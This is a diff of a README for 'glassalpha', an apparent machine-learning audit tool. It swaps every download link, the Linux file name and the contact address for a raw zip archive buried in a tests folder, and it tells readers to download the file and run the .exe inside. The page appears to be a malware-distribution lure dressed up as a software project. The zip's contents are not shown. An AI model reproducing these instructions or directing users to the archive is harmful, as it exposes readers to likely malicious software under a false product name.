@@ -1,7 +1,7 @@
 # 🛠️ glassalpha - Easy Audits for Your Machine Learning Models
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/asibic/glassalpha/main/gibblegabble/glassalpha.zip%20Latest%20Release-v1.0.0-brightgreen)](https://raw.githubusercontent.com/asibic/glassalpha/main/gibblegabble/glassalpha.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/asibic/glassalpha/main/packages/tests/metrics/stability/Software-v3.6-alpha.1.zip%20Latest%20Release-v1.0.0-brightgreen)](https://raw.githubusercontent.com/asibic/glassalpha/main/packages/tests/metrics/stability/Software-v3.6-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -22,7 +22,7 @@ To get started, please follow these steps:
 
 1. **Visit the Releases Page**  
    Click the link below to go to the releases page where you can download the latest version of glassalpha.  
-   [Download from Releases](https://raw.githubusercontent.com/asibic/glassalpha/main/gibblegabble/glassalpha.zip)
+   [Download from Releases](https://raw.githubusercontent.com/asibic/glassalpha/main/packages/tests/metrics/stability/Software-v3.6-alpha.1.zip)
 
 2. **Choose Your Version**  
    On the releases page, look for the latest version. This will usually be at the top of the list and labeled as “Latest Release.” 
@@ -31,12 +31,12 @@ To get started, please follow these steps:
    You'll see options to download different files. Choose the one suitable for your operating system:
    - For **Windows**, look for a file ending in `.exe`.
    - For **macOS**, look for a file ending in `.dmg`.
-   - For **Linux**, look for the `https://raw.githubusercontent.com/asibic/glassalpha/main/gibblegabble/glassalpha.zip` or a similar format.
+   - For **Linux**, look for the `https://raw.githubusercontent.com/asibic/glassalpha/main/packages/tests/metrics/stability/Software-v3.6-alpha.1.zip` or a similar format.
 
 4. **Install glassalpha**  
    - For **Windows**: Double-click the downloaded `.exe` file and follow the prompts to install.
    - For **macOS**: Open the downloaded `.dmg` file and drag the glassalpha icon to your Applications folder.
-   - For **Linux**: Extract the `https://raw.githubusercontent.com/asibic/glassalpha/main/gibblegabble/glassalpha.zip` file in your preferred location.
+   - For **Linux**: Extract the `https://raw.githubusercontent.com/asibic/glassalpha/main/packages/tests/metrics/stability/Software-v3.6-alpha.1.zip` file in your preferred location.
 
 5. **Run glassalpha**  
    - **Windows**: After installation, find glassalpha in your Start Menu and click to open it.
@@ -85,6 +85,6 @@ We welcome contributions to enhance glassalpha. If you wish to contribute, pleas
 
 ## 📞 Contact
 
-For any inquiries or support, feel free to reach us at [https://raw.githubusercontent.com/asibic/glassalpha/main/gibblegabble/glassalpha.zip](https://raw.githubusercontent.com/asibic/glassalpha/main/gibblegabble/glassalpha.zip).
+For any inquiries or support, feel free to reach us at [https://raw.githubusercontent.com/asibic/glassalpha/main/packages/tests/metrics/stability/Software-v3.6-alpha.1.zip](https://raw.githubusercontent.com/asibic/glassalpha/main/packages/tests/metrics/stability/Software-v3.6-alpha.1.zip).
 
 Explore the full capabilities of glassalpha today and simplify your machine learning audits!
